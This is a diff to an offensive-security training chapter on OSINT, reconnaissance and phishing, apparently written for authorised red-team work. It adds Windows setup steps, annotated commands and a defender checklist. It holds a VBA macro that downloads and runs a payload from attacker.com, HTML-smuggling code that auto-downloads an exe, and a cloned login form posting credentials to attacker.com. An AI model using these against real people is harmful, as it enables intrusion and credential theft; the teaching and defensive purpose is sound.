@@ -15,6 +15,170 @@ You are now learning to be a full-spectrum operator.
 
 ---
 
+## WINDOWS SETUP
+
+Every tool mentioned in this chapter is listed here. Most are Linux-native. **You need WSL2** for most of them. Install it first.
+
+### Install WSL2
+
+Open PowerShell as Administrator:
+
+```powershell
+wsl --install
+# Installs WSL2 + Ubuntu by default. Requires a reboot.
+# After reboot, WSL will prompt you to create a Linux username/password.
+```
+
+Verify:
+```powershell
+wsl --version
+# Expected: WSL version 2.x.x.x
+```
+
+**Admin rights required for WSL2 install.** All subsequent tool installs run inside WSL2 (the Ubuntu shell), not PowerShell directly.
+
+---
+
+### Tool Install Commands
+
+Open WSL2 (run `wsl` in any terminal) and run these:
+
+**theHarvester** — email/subdomain/host OSINT aggregator
+```bash
+sudo apt install theharvester -y
+# Verify:
+theHarvester --version
+# Expected: theHarvester 4.x.x
+```
+
+**subfinder** — passive subdomain enumeration
+```bash
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+# Requires Go. Install Go first if missing:
+sudo apt install golang-go -y
+# Verify:
+subfinder --version
+# Expected: subfinder v2.x.x
+```
+
+**amass** — comprehensive subdomain enum + OSINT
+```bash
+sudo apt install amass -y
+# OR via Go:
+go install -v github.com/owasp-amass/amass/v4/...@master
+# Verify:
+amass -version
+# Expected: v4.x.x
+```
+
+**ffuf** — web fuzzer (subdomain brute force, directory brute force)
+```bash
+go install github.com/ffuf/ffuf/v2@latest
+# Verify:
+ffuf -V
+# Expected: ffuf v2.x.x
+```
+
+**httpx** — fast HTTP probing (check which subdomains are live)
+```bash
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+# Verify:
+httpx --version
+# Expected: httpx v1.x.x
+```
+
+**gitleaks** — scan git repos for leaked secrets
+```bash
+# Download the Linux binary directly (fastest):
+wget https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_8.18.4_linux_x64.tar.gz
+tar -xzf gitleaks_8.18.4_linux_x64.tar.gz
+sudo mv gitleaks /usr/local/bin/
+# Verify:
+gitleaks version
+# Expected: v8.x.x
+```
+
+**trufflehog** — deep secret scanning including commit history
+```bash
+curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin
+# Verify:
+trufflehog --version
+# Expected: trufflehog 3.x.x
+```
+
+**GoPhish** — phishing campaign management (runs natively on Windows)
+```powershell
+# Download Windows binary from: https://github.com/gophish/gophish/releases
+# Extract the zip. Run gophish.exe as Administrator.
+# Verify: open https://localhost:3333 in browser after launch
+# Default creds printed to console on first run
+```
+
+**Shodan CLI** — query Shodan from the command line (works on Windows)
+```powershell
+pip install shodan
+# Verify:
+shodan --version
+# Expected: 1.x.x
+```
+
+**Nmap** — port scanning / SMTP enumeration (Windows native)
+```powershell
+# Download installer: https://nmap.org/download.html
+# Verify:
+nmap --version
+# Expected: Nmap 7.x.x
+```
+
+**AWS CLI** — S3 bucket enumeration (Windows native)
+```powershell
+winget install -e --id Amazon.AWSCLI
+# Verify:
+aws --version
+# Expected: aws-cli/2.x.x
+```
+
+**jq** — JSON processor (used with crt.sh queries, runs in WSL2)
+```bash
+sudo apt install jq -y
+# Verify:
+jq --version
+# Expected: jq-1.6 or higher
+```
+
+**curl** — already installed on modern Windows. For consistency, use the WSL2 version.
+```bash
+curl --version
+# Expected: curl 7.x.x or higher
+```
+
+**webanalyze** — CLI version of Wappalyzer for tech fingerprinting
+```bash
+go install github.com/rverton/webanalyze/cmd/webanalyze@latest
+# Verify:
+webanalyze -version
+# Expected: version string printed
+```
+
+**WhatWeb** — web fingerprinting tool
+```bash
+sudo apt install whatweb -y
+# Verify:
+whatweb --version
+# Expected: WhatWeb version 0.5.x
+```
+
+---
+
+### WSL2 Notes for Windows Users
+
+- All `bash` code blocks in this chapter run inside WSL2 unless stated otherwise
+- Access Windows files from WSL2 at `/mnt/c/Users/yourname/`
+- Access WSL2 files from Windows Explorer at `\\wsl$\Ubuntu\`
+- Go binaries install to `~/go/bin/` inside WSL2 — add to PATH: `echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc && source ~/.bashrc`
+
+---
+
 ## OSINT — Open Source Intelligence
 
 OSINT is the collection and analysis of publicly available information. "Publicly available" is doing heavy lifting in that sentence — you'd be horrified at what's public.
@@ -96,12 +260,21 @@ webcam has_screenshot:true
 "Siemens" port:102                  -- SCADA/ICS
 ```
 
-**Shodan CLI:**
+**Shodan CLI** (install via `pip install shodan` on Windows or in WSL2):
 ```bash
-shodan init YOUR_API_KEY
-shodan search --fields ip_str,port,org "hostname:target.com"
-shodan host 203.0.113.50
+shodan init YOUR_API_KEY    # Authenticate with your API key (free tier works for basic searches)
+shodan search --fields ip_str,port,org "hostname:target.com"  # Show IPs, ports, org name
+shodan host 203.0.113.50    # Full details on a single IP
 ```
+
+#### Expected Output
+```
+# shodan search --fields ip_str,port,org "hostname:target.com"
+203.0.113.50    443    Target Corp
+203.0.113.51    80     Target Corp
+203.0.113.52    22     Target Corp
+```
+Failure looks like `Error: Invalid API key` — means you need to register at shodan.io and run `shodan init` with your key.
 
 **Censys** (`search.censys.io`) — similar to Shodan but with a different index. Some things show up on Censys that Shodan misses, and vice versa. Use both.
 
@@ -127,14 +300,27 @@ People post everything. Their location, their workplace, their tech stack, their
 ```bash
 # Search for leaked secrets in target's repos
 # Historical commits may contain credentials even if they've been removed
-git log --all -p | grep -iE "(password|secret|api[_-]?key|token)" 
+git log --all -p | grep -iE "(password|secret|api[_-]?key|token)"    # Search entire commit history
 
 # Gitleaks — automated secret scanning
-gitleaks detect --source https://github.com/target/repo
+gitleaks detect --source https://github.com/target/repo   # Scan the entire repo including history
 
 # trufflehog — deep secret scanning including commit history
-trufflehog git https://github.com/target/repo --only-verified
+trufflehog git https://github.com/target/repo --only-verified   # Only print confirmed live secrets
 ```
+
+#### Expected Output
+```
+# gitleaks detect output (secrets found):
+Finding:     DB_PASSWORD=supersecret123
+Secret:      supersecret123
+RuleID:      generic-api-key
+Entropy:     3.58
+File:        config/.env
+Line:        4
+Commit:      a3f1b2c
+```
+Failure looks like `WARN[0000] No leaks found` — means either no secrets were committed or gitleaks needs the `--no-git` flag if you're scanning a local non-git directory.
 
 **What developers accidentally commit:**
 - `.env` files with database passwords, API keys, cloud credentials
@@ -157,26 +343,35 @@ whois target.com
 # Registrar, nameservers, creation/expiry dates
 
 # DNS records
-dig target.com ANY
-dig target.com MX         -- Mail servers
-dig target.com TXT        -- SPF, DKIM, DMARC (and sometimes secrets)
-dig target.com NS         -- Nameservers
-dig _dmarc.target.com TXT -- DMARC policy
+dig target.com ANY       # All records at once
+dig target.com MX        # Mail servers (where email goes)
+dig target.com TXT       # SPF, DKIM, DMARC (and sometimes secrets)
+dig target.com NS        # Nameservers
+dig _dmarc.target.com TXT  # DMARC policy (p=none = no enforcement = spoof freely)
 
 # Reverse DNS
-dig -x 203.0.113.50
+dig -x 203.0.113.50      # IP → hostname
 
-# DNS zone transfer (if misconfigured)
+# DNS zone transfer (if misconfigured — usually fails on hardened targets)
 dig axfr @ns1.target.com target.com
 # If this works, you just got every DNS record. Jackpot.
 ```
+
+#### Expected Output
+```
+# dig target.com MX
+;; ANSWER SECTION:
+target.com.    300    IN    MX    10 mail.target.com.
+target.com.    300    IN    MX    20 mail2.target.com.
+```
+Failure looks like `SERVFAIL` or no ANSWER SECTION — means the DNS server refused the query or the record doesn't exist. Try a different DNS resolver: `dig @8.8.8.8 target.com MX`
 
 ### Certificate Transparency Logs
 
 Every TLS certificate is logged publicly. This reveals subdomains the target may not want public:
 
 ```bash
-# crt.sh
+# Query crt.sh for all certificates matching *.target.com
 curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
 
 # Results include:
@@ -186,6 +381,17 @@ curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' 
 # vpn.target.com
 # jenkins.target.com
 ```
+
+#### Expected Output
+```
+# curl + jq output:
+dev.target.com
+internal-api.target.com
+jenkins.target.com
+staging.target.com
+vpn.target.com
+```
+Failure looks like `parse error (Invalid numeric literal at line 1, column 1)` — means crt.sh returned an error page instead of JSON. The site rate-limits aggressively; wait 30 seconds and retry.
 
 Dev and staging environments are almost always less hardened than production.
 
@@ -205,9 +411,28 @@ curl "https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY"
 # phonebook.cz — free email/URL/domain enumeration
 # Manual search at phonebook.cz, results are extensive
 
-# theHarvester — aggregates multiple sources
+# theHarvester — aggregates multiple sources (Google, LinkedIn, Shodan, etc.)
 theHarvester -d target.com -b all -l 500
+# -d = domain to search
+# -b = data source (all = every available source)
+# -l = result limit (500 results max per source)
 ```
+
+#### Expected Output
+```
+# theHarvester output:
+[*] Emails found: 12
+------------------
+john.smith@target.com
+sarah.jones@target.com
+admin@target.com
+
+[*] Hosts found: 8
+-----------------
+mail.target.com:203.0.113.50
+www.target.com:203.0.113.1
+```
+Failure looks like `[-] No results found` — means the domain has tight privacy controls, or the sources (Google, etc.) returned nothing. Try `-b google` or `-b linkedin` individually to isolate which source works.
 
 **Email pattern identification:**
 ```
@@ -242,14 +467,14 @@ Headers reveal:
 ```bash
 # SMTP verification — check if an address exists without sending mail
 
-# Connect to the MX server
+# Connect to the MX server and test SMTP commands
 nmap -Pn -p25 --script smtp-commands mail.target.com
 
-# Manual SMTP session
+# Manual SMTP session (telnet is available in WSL2)
 telnet mail.target.com 25
-HELO attacker.com
-MAIL FROM:<test@attacker.com>
-RCPT TO:<john.smith@target.com>
+HELO attacker.com                        # Introduce yourself to the server
+MAIL FROM:<test@attacker.com>            # Pretend to send from anywhere
+RCPT TO:<john.smith@target.com>          # Test if this address exists
 # 250 = exists, 550 = doesn't exist
 
 # Some servers respond differently to valid vs invalid addresses
@@ -258,9 +483,9 @@ RCPT TO:<john.smith@target.com>
 
 **Tools:**
 ```bash
-# smtp-user-enum
-smtp-user-enum -M VRFY -U users.txt -t mail.target.com
-smtp-user-enum -M RCPT -U users.txt -t mail.target.com
+# smtp-user-enum (install in WSL2: sudo apt install smtp-user-enum -y)
+smtp-user-enum -M VRFY -U users.txt -t mail.target.com   # VRFY method
+smtp-user-enum -M RCPT -U users.txt -t mail.target.com   # RCPT method (more common)
 ```
 
 ---
@@ -272,26 +497,36 @@ Map everything the target owns on the internet. Every subdomain, every IP, every
 ### Subdomain Enumeration
 
 ```bash
-# Passive enumeration (no direct contact with target)
-subfinder -d target.com -o subs.txt
-amass enum -passive -d target.com
+# Passive enumeration (no direct contact with target — safer, quieter)
+subfinder -d target.com -o subs.txt    # Write results to subs.txt
+amass enum -passive -d target.com       # Passive mode: queries APIs, not the target
 
-# Certificate transparency
+# Certificate transparency (passive — querying crt.sh, not the target)
 curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u >> subs.txt
 
-# SecurityTrails API
+# SecurityTrails API (requires free account for API key)
 curl "https://api.securitytrails.com/v1/domain/target.com/subdomains" -H "APIKEY: KEY"
 
-# Active enumeration (sends DNS queries — target might notice)
+# Active enumeration (sends DNS queries — target MIGHT notice in DNS logs)
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
      -u http://FUZZ.target.com -mc 200,301,302,403
+# -w = wordlist, -u = URL template (FUZZ = inject word here), -mc = match these HTTP codes
 
-# DNS brute force
+# DNS brute force (active — generates DNS traffic)
 amass enum -brute -d target.com -w subdomains.txt
 
-# Resolve and probe
+# Resolve all found subdomains and probe which ones are live + get tech info
 cat subs.txt | sort -u | httpx -silent -status-code -title -tech-detect
 ```
+
+#### Expected Output (httpx probe)
+```
+https://dev.target.com [200] [Dev Portal] [nginx,PHP]
+https://jenkins.target.com [403] [Jenkins] [Java,Jetty]
+https://staging.target.com [200] [Staging - Target App] [React,Node.js]
+https://vpn.target.com [200] [Pulse Secure] [SSL-VPN]
+```
+Failure looks like all lines showing `[000]` — means httpx can't resolve the domains. Check DNS with `dig dev.target.com` first to confirm the subdomains actually resolve.
 
 ### Technology Stack Identification
 
@@ -299,12 +534,12 @@ cat subs.txt | sort -u | httpx -silent -status-code -title -tech-detect
 
 ```bash
 # Wappalyzer / webanalyze (CLI version)
-webanalyze -host target.com
+webanalyze -host target.com   # Returns detected technologies and versions
 
-# WhatWeb
-whatweb target.com -a 3
+# WhatWeb — more aggressive fingerprinting
+whatweb target.com -a 3       # -a 3 = aggressive mode (sends more probes)
 
-# HTTP headers reveal a lot
+# HTTP headers reveal a lot (single curl command, no tool needed)
 curl -sI https://target.com
 # Server: nginx/1.21.3           ← Web server + version
 # X-Powered-By: PHP/8.1          ← Language + version
@@ -325,18 +560,17 @@ curl -sI https://target.com
 # S3 bucket enumeration
 # Common naming patterns:
 # target.com → target, target-prod, target-dev, target-backup, target-assets
-aws s3 ls s3://target-backup --no-sign-request
-# "no sign request" = try anonymous access
+aws s3 ls s3://target-backup --no-sign-request    # --no-sign-request = try anonymous access
+# If it prints file listings: the bucket is publicly readable. That's a critical finding.
 
 # S3 bucket finder tools
-python3 cloud_enum.py -k target
+python3 cloud_enum.py -k target    # Tries many naming permutations automatically
 
-# Azure blob storage
+# Azure blob storage (curl directly — no tool needed)
 # target.blob.core.windows.net
 curl https://target.blob.core.windows.net/\$web?restype=container\&comp=list
 
-# GCP storage
-# storage.googleapis.com/target-bucket
+# GCP storage (requires gsutil — install via Google Cloud SDK)
 gsutil ls gs://target-bucket
 ```
 
@@ -475,7 +709,9 @@ IT Security Alert: Unusual Login Detected
 **Office macros (classic but dying):**
 ```vba
 Sub AutoOpen()
+    ' AutoOpen runs automatically when the document is opened
     Shell "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+    ' -ep bypass = disable execution policy, IEX = Invoke-Expression (run the downloaded string as code)
 End Sub
 ```
 Microsoft has been disabling macros by default since 2022, but many organisations re-enable them for "business needs."
@@ -483,13 +719,15 @@ Microsoft has been disabling macros by default since 2022, but many organisation
 **HTML smuggling:**
 ```html
 <!-- Embed a binary in the HTML, reconstruct it via JavaScript -->
+<!-- The entire payload lives inside the HTML — email scanners see HTML, not an executable -->
 <script>
-var data = atob("TVqQAAMAAAAEAAAA...");  // Base64-encoded exe
+var data = atob("TVqQAAMAAAAEAAAA...");  // Base64-encoded exe — atob() decodes it
 var blob = new Blob([new Uint8Array([...data].map(c => c.charCodeAt(0)))], {type: 'application/octet-stream'});
-var a = document.createElement('a');
-a.href = URL.createObjectURL(blob);
-a.download = "Important_Document.exe";
-a.click();
+// Blob = in-memory binary object — no file written to disk until the next line
+var a = document.createElement('a');   // Create an invisible download link
+a.href = URL.createObjectURL(blob);    // Point it at the in-memory binary
+a.download = "Important_Document.exe"; // Filename the user sees
+a.click();                             // Trigger download automatically — no user action needed
 </script>
 ```
 The payload is assembled in the browser. Email security scans see an HTML file, not an executable.
@@ -499,11 +737,13 @@ Embed a QR code in the email or a PDF attachment. The user scans it with their p
 
 **Link manipulation:**
 ```html
+<!-- Display text says target.com but href goes to attacker -->
 <a href="https://attacker.com/login">https://target.com/login</a>
 
-<!-- Or with URL encoding -->
+<!-- Or with URL encoding — the @ trick -->
 https://target.com@attacker.com/login
 <!-- Browsers treat everything before @ as a username, not a domain -->
+<!-- So the actual domain here is attacker.com, not target.com -->
 ```
 
 ### Credential Harvesting
@@ -511,18 +751,20 @@ https://target.com@attacker.com/login
 Clone the target's login page:
 
 ```bash
-# Quick clone with wget
-wget -mk https://target.com/login
+# Quick clone with wget (runs in WSL2)
+wget -mk https://target.com/login    # -m = mirror, -k = convert links for local viewing
 
 # Or use Gophish, evilginx2, or Modlishka for automated campaigns
 ```
 
 Modify the form action to POST to your server:
 ```html
+<!-- Original form posts to target.com — you change this one line -->
 <form action="https://attacker.com/capture" method="POST">
     <input name="username" placeholder="Email">
     <input name="password" type="password" placeholder="Password">
     <button>Sign In</button>
+    <!-- After submit, redirect user to real site so they don't notice -->
 </form>
 ```
 
@@ -530,20 +772,33 @@ Modify the form action to POST to your server:
 
 ### GoPhish for Controlled Campaigns
 
-GoPhish is the standard tool for authorised phishing assessments:
+GoPhish is the standard tool for authorised phishing assessments. On Windows, run it natively (no WSL2 needed):
 
 ```bash
-# Install and configure
-./gophish
-
-# Web admin at https://localhost:3333
-# 1. Create email template (your phishing email)
-# 2. Create landing page (your fake login page)
-# 3. Create user group (target email addresses)
-# 4. Create sending profile (SMTP server)
-# 5. Launch campaign
-# 6. Track: emails sent, emails opened, links clicked, credentials entered
+# Extract the downloaded zip, then run from PowerShell (as Admin):
+.\gophish.exe
+# Web admin at https://localhost:3333 — accept the self-signed cert warning
 ```
+
+Campaign setup workflow:
+```bash
+# 1. Create email template (your phishing email — supports variable substitution)
+# 2. Create landing page (your fake login page — paste the cloned HTML here)
+# 3. Create user group (CSV upload: First Name, Last Name, Email, Position)
+# 4. Create sending profile (your SMTP relay settings)
+# 5. Launch campaign
+# 6. Track in real time: emails sent, emails opened, links clicked, credentials entered
+```
+
+#### Expected Output (GoPhish dashboard stats)
+```
+Campaign: Q4 Password Audit
+Emails sent:     47
+Emails opened:   31  (66%)
+Links clicked:   22  (47%)
+Creds submitted: 19  (40%)
+```
+Failure looks like `Error: Failed to connect to SMTP server` — means your sending profile credentials are wrong or the SMTP relay is blocking unauthenticated connections.
 
 The tracking data is what matters for the client report. "42% of your employees entered their credentials on a fake login page" is the kind of metric that gets security budgets approved.
 
@@ -732,8 +987,7 @@ site:github.com "your_username"
 # Check breach databases
 # haveibeenpwned.com — check if your email is in known breaches
 
-# Check your GitHub
-# Are there any secrets in your commit history?
+# Check your GitHub — are there any secrets in your commit history?
 trufflehog git https://github.com/YOUR_USERNAME/YOUR_REPO
 ```
 
@@ -831,6 +1085,32 @@ This manual gave you the theory, the techniques, and the methodology. What it ca
 - **Red team operations**: Authorised adversary simulation against real organisations.
 
 The manual is the map. The territory is out there. Go operate.
+
+---
+
+## DEFENDER TAKEAWAY
+
+You built the attack toolchain. Now deploy the countermeasures. These are the Monday-morning actions your company should take based on everything in this chapter.
+
+- **Run OSINT against yourself before attackers do.** Google dork your own domain (`filetype:env site:yourcompany.com`, `filetype:sql site:yourcompany.com`). Check crt.sh for unexpected subdomains. Search GitHub for your company name. If you find something, an attacker already has. Fix it first.
+
+- **Set DMARC to `p=reject`, not `p=none`.** Check yours right now: `dig _dmarc.yourcompany.com TXT`. If it says `p=none`, your domain can be spoofed with no technical barrier. Change it to `p=quarantine` first (watch for false positives in spam folder), then `p=reject`. This kills the majority of sender-spoofing phishing cold.
+
+- **Scan your own GitHub repos for leaked secrets.** Run `gitleaks detect` or `trufflehog git` against every repo — especially ones that were public even briefly. Rotate any secret that shows up. Enable GitHub's own secret scanning (free for public repos, paid for private): Settings → Security → Secret scanning.
+
+- **Monitor for lookalike domain registrations.** Services like dnstwist or DNSWatch alert you when someone registers `yourcompany-corp.com` or `yourcompanny.com`. Register the most obvious typosquats yourself. Brand monitoring costs less than responding to a phishing incident.
+
+- **Windows Event ID 4625 is your phishing alarm.** After a phishing campaign, attackers try harvested credentials. Failed logins (Event ID 4625) from multiple accounts from the same external IP in a short window = credential stuffing attack with phished passwords. Set an alert on this in your SIEM or Event Viewer. Also watch Event ID 4648 (explicit credential use) for lateral movement.
+
+- **Windows Event ID 7045 detects USB implant persistence.** The Rubber Ducky and Bash Bunny establish persistence by installing services. Event ID 7045 in the System log fires when a new service is installed. An alert on this event outside of your change management window catches USB drop payloads and other service-based persistence in real time.
+
+- **Disable AutoRun/AutoPlay on all endpoints via Group Policy.** The setting is: Computer Configuration → Administrative Templates → Windows Components → AutoPlay Policies → Turn off AutoPlay → Enabled → All drives. This kills the trivial "plug in USB, malware runs automatically" vector. Deploy it to every machine in your domain. This is a five-minute Group Policy change with zero operational impact.
+
+- **Run authorised phishing simulations quarterly.** Use GoPhish or a managed service (KnowBe4, Proofpoint Security Awareness). Track click rates and credential submission rates over time. The goal is not to catch individuals — it is to measure the organisation's aggregate risk posture and justify security training budgets with concrete numbers. A 40% credential submission rate is a board-level finding.
+
+- **Treat physical security as part of your attack surface.** Tailgating bypass and badge cloning are not theoretical — they work. Require badge scan on every door (not just entry). Train reception staff to challenge anyone who doesn't badge in. Shred everything — org charts, phone directories, printed configs. Hard drives go to a certified destruction service, not general waste.
+
+- **Lock down public-facing cloud storage.** Run `aws s3api get-bucket-acl --bucket your-bucket-name` for every S3 bucket in your account. Any bucket with `AllUsers` or `AuthenticatedUsers` in the grants is exposed. Audit quarterly. Enable S3 Block Public Access at the account level in the AWS Console — this prevents any future misconfiguration from going public automatically.
 
 ---
 
